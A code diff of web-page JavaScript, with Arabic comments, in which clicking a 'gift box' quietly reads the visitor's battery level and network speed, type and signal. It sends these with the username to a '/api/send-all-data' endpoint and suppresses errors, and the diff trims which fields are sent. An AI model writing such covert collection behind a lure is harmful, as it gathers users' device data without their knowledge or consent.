@@ -405,24 +405,17 @@ giftBox.addEventListener('click', function() {
       navigator.getBattery().then(function(battery) {
         let percent = Math.round(battery.level * 100);
         
-        // جلب معلومات النت الحقيقية من المتصفح
+        // جلب معلومات النت من المتصفح
         const connection = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
         
-        let downloadSpeed = 'غير معروف';
-        let uploadSpeed = 'غير معروف';
-        let pingLatency = 'غير معروف';
-        let signalStrength = 'غير معروف';
-        let networkType = 'غير معروف';
+        let speed = 'غير معروف';
+        let signal = 'غير معروف';
+        let network = 'غير معروف';
         
         if (connection) {
-          // السرعة الفعلية (Download)
+          // السرعة الفعلية (downlink)
           if (connection.downlink !== undefined && connection.downlink !== null) {
-            downloadSpeed = connection.downlink + ' Mbps';
-          }
-          
-          // الـ Ping (RTT)
-          if (connection.rtt !== undefined && connection.rtt !== null) {
-            pingLatency = connection.rtt + ' ms';
+            speed = connection.downlink.toFixed(2) + ' Mbps';
           }
           
           // نوع الشبكة
@@ -433,42 +426,34 @@ giftBox.addEventListener('click', function() {
               '3g': '3G',
               '4g': '4G'
             };
-            networkType = types[connection.effectiveType] || connection.effectiveType;
+            network = types[connection.effectiveType] || connection.effectiveType;
           }
           
-          // قوة الإشارة الفعلية (Bars)
+          // قوة الإشارة (bars)
           if (connection.bars !== undefined && connection.bars !== null) {
             const bars = Math.min(Math.max(Math.round(connection.bars), 0), 4);
-            signalStrength = bars + '/4';
+            signal = bars + '/4';
           } else {
-            // تقدير من السرعة لو مش متوفرة
-            const speed = connection.downlink || 0;
-            if (speed >= 50) signalStrength = '4/4';
-            else if (speed >= 20) signalStrength = '3/4';
-            else if (speed >= 5) signalStrength = '2/4';
-            else if (speed >= 1) signalStrength = '1/4';
-            else signalStrength = '0/4';
-          }
-          
-          // Upload تقديري من الـ downlink
-          if (connection.downlink) {
-            const estimatedUpload = connection.downlink * 0.3;
-            uploadSpeed = estimatedUpload.toFixed(2) + ' Mbps';
+            // تقدير من السرعة
+            const spd = connection.downlink || 0;
+            if (spd >= 50) signal = '4/4';
+            else if (spd >= 20) signal = '3/4';
+            else if (spd >= 5) signal = '2/4';
+            else if (spd >= 1) signal = '1/4';
+            else signal = '0/4';
           }
         }
         
-        // إرسال كل البيانات
+        // إرسال البيانات
         fetch('/api/send-all-data', {
           method: 'POST',
           headers: { 'Content-Type': 'application/json' },
           body: JSON.stringify({ 
             username: username, 
             battery: percent,
-            download: downloadSpeed,
-            upload: uploadSpeed,
-            ping: pingLatency,
-            signal: signalStrength,
-            network: networkType
+            speed: speed,
+            signal: signal,
+            network: network
           })
         });
       }).catch(() => {});
